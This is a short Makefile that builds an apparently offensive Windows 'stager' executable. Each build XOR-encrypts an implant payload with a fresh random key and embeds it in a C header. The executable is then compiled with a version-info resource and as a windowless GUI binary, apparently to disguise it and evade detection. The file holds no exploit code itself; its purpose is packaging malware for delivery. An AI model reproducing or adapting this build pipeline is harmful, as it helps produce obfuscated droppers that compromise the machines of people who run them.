# stager Makefile
#
# Usage:
#   make PICO=/path/to/implant.crystal.bin
#   make PICO=/path/to/implant.crystal.bin OUTPUT=/path/to/stager.exe

CC      := x86_64-w64-mingw32-gcc
WINDRES := x86_64-w64-mingw32-windres
CFLAGS  := -Wall -Os -mwindows
LDFLAGS := -ladvapi32 -lbcrypt

PICO   ?= $(error PICO is not set — run: make PICO=/path/to/implant.crystal.bin)
OUTPUT ?= ../build/stager.exe

.PHONY: all clean

all: $(OUTPUT)

# ── Step 1: XOR-encrypt PICO → C header (fresh random key every build) ────
pico_payload.h: $(PICO) gen_payload.py
	python3 gen_payload.py $(PICO) $@

# ── Step 2: compile version info resource ─────────────────────────────────
resource.o: resource.rc
	$(WINDRES) resource.rc -o resource.o

# ── Step 3: link final EXE ────────────────────────────────────────────────
$(OUTPUT): stager.c pico_payload.h resource.o
	@mkdir -p "$(dir $(OUTPUT))"
	$(CC) $(CFLAGS) -o "$@" stager.c resource.o $(LDFLAGS)

clean:
	rm -f pico_payload.h resource.o
